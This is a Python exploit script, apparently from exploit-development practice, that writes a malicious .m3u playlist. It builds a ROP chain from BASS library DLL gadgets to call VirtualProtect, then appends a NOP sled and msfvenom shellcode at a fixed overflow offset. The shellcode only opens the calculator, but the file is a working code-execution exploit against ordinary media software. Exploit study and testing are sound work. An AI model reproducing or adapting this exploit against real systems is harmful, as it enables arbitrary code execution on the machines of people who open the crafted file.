# Borrowed ROP from script: https://www.exploit-db.com/exploits/40018/ by author secfigo
# Created to test SEH memory offsets with padding relativeness
# Created by Hodorsec

import sys, struct

def create_rop_chain():
    # rop chain generated with mona.py - www.corelan.be
    # !mona rop -cpb '\x00\x09\x0a\x0d\x1a' -o
    rop_gadgets = [
      # EBP
      0x10605ce4,  # POP EBP # RETN [BASSMIDI.dll] 
      0x10605ce4,  # skip 4 bytes [BASSMIDI.dll]

      # EBX
      0x10015f82,  # POP EAX # RETN [BASS.dll] 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x10014db4,  # NEG EAX # RETN [BASS.dll] 
      0x10032f32,  # XCHG EAX,EBX # RETN 0x00 [BASS.dll] 

      # EDX
      0x10015f82,  # POP EAX # RETN [BASS.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x10014db4,  # NEG EAX # RETN [BASS.dll] 
      0x10038a6d,  # XCHG EAX,EDX # RETN [BASS.dll] 

      # ECX
      0x101049d8,  # POP ECX # RETN [BASSWMA.dll] 
      0x1010971f,  # &Writable location [BASSWMA.dll]

      # EDI
      0x10016218,  # POP EDI # RETN [BASS.dll] 
      0x1001dc05,  # RETN (ROP NOP) [BASS.dll]

      # ESI
      0x1010277f,  # POP ESI # RETN [BASSWMA.dll] 
      0x10101c02,  # JMP [EAX] [BASSWMA.dll]

      # EAX
      0x10015fe7,  # POP EAX # RETN [BASS.dll] 
      0x10109270,  # ptr to &VirtualProtect() [IAT BASSWMA.dll]

      # PUSHAD
      0x1001d7a5,  # PUSHAD # RETN [BASS.dll] 
      0x1010539f,  # ptr to 'jmp esp' [BASSWMA.dll]
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

# msfvenom -p windows/exec cmd=calc.exe exitfunc=thread -v shellcode -f python -b '\x00\x09\x0a\x0d\x1a'
# size = 220
shellcode =  ""
shellcode += "\xb8\x55\x9e\x01\x8e\xdb\xce\xd9\x74\x24\xf4\x5b"
shellcode += "\x2b\xc9\xb1\x31\x83\xeb\xfc\x31\x43\x0f\x03\x43"
shellcode += "\x5a\x7c\xf4\x72\x8c\x02\xf7\x8a\x4c\x63\x71\x6f"
shellcode += "\x7d\xa3\xe5\xfb\x2d\x13\x6d\xa9\xc1\xd8\x23\x5a"
shellcode += "\x52\xac\xeb\x6d\xd3\x1b\xca\x40\xe4\x30\x2e\xc2"
shellcode += "\x66\x4b\x63\x24\x57\x84\x76\x25\x90\xf9\x7b\x77"
shellcode += "\x49\x75\x29\x68\xfe\xc3\xf2\x03\x4c\xc5\x72\xf7"
shellcode += "\x04\xe4\x53\xa6\x1f\xbf\x73\x48\xcc\xcb\x3d\x52"
shellcode += "\x11\xf1\xf4\xe9\xe1\x8d\x06\x38\x38\x6d\xa4\x05"
shellcode += "\xf5\x9c\xb4\x42\x31\x7f\xc3\xba\x42\x02\xd4\x78"
shellcode += "\x39\xd8\x51\x9b\x99\xab\xc2\x47\x18\x7f\x94\x0c"
shellcode += "\x16\x34\xd2\x4b\x3a\xcb\x37\xe0\x46\x40\xb6\x27"
shellcode += "\xcf\x12\x9d\xe3\x94\xc1\xbc\xb2\x70\xa7\xc1\xa5"
shellcode += "\xdb\x18\x64\xad\xf1\x4d\x15\xec\x9f\x90\xab\x8a"
shellcode += "\xed\x93\xb3\x94\x41\xfc\x82\x1f\x0e\x7b\x1b\xca"
shellcode += "\x6b\x63\xf9\xdf\x81\x0c\xa4\xb5\x28\x51\x57\x60"
shellcode += "\x6e\x6c\xd4\x81\x0e\x8b\xc4\xe3\x0b\xd7\x42\x1f"
shellcode += "\x61\x48\x27\x1f\xd6\x69\x62\x7c\xb9\xf9\xee\xad"
shellcode += "\x5c\x7a\x94\xb1"

# Filename
filename = "sploit_sploiter.m3u"

# Maximum length
maxlen = 5000

# Offsets
seh_offset = 996
eip_offset = 1012

# Prefix
prefix = "A" * eip_offset

# NOPS
nop = "\x90" * 20

# Padding
padding = "D" * (maxlen - len(prefix + rop_chain + nop + shellcode))
payload = prefix + rop_chain + nop + shellcode + padding

f = open(filename, "w")
f.write(payload)
